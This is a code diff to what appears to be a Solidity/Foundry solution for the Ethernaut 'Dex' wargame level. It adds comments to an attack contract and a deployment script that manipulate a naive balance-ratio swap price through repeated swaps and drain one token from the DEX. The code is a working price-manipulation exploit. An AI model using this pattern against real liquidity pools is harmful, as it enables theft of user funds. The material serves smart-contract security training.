@@ -32,6 +32,15 @@ interface IDex {
     Theres more than one way to interact with a contract!
     Remix might help
     What does "At Address" do?
+
+    Solution:
+    Because of the low liquidity and how price is calculated using the following function
+        function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
+            return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
+        }
+
+    our transfers make a big impact on the price.
+    If we swap enough times the price will be impacted and we can drain all of one token
  */
 
 
@@ -51,20 +60,25 @@ contract DexAttack {
     }
 
     function swap() external {
+        // Transfer tokens from player to attack contract
         token1.transferFrom(msg.sender, address(this), 10);
         token2.transferFrom(msg.sender, address(this), 10);
 
+        // Approve tokens for dex contract
         token1.approve(address(dex), type(uint256).max);
         token2.approve(address(dex), type(uint256).max);
 
+        // Swap enough times to manipulate price
         _swap(token1, token2);
         _swap(token2, token1);
         _swap(token1, token2);
         _swap(token2, token1);
         _swap(token1, token2);
 
+        // Swap kas amount
         dex.swap(address(token2), address(token1), 45);
 
+        // Check requirements were reached
         require(token1.balanceOf(address(dex)) == 0);
     }
 }
@@ -78,9 +92,14 @@ contract DexSolution is Script {
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
         DexAttack dexAttack = new DexAttack(dex);
+
+        // Approve attack contract for our tokens
         token1.approve(address(dexAttack), 10);
         token2.approve(address(dexAttack), 10);
+
+        // Start attack on the attack contract
         dexAttack.swap();
+
         vm.stopBroadcast();
     }
 }
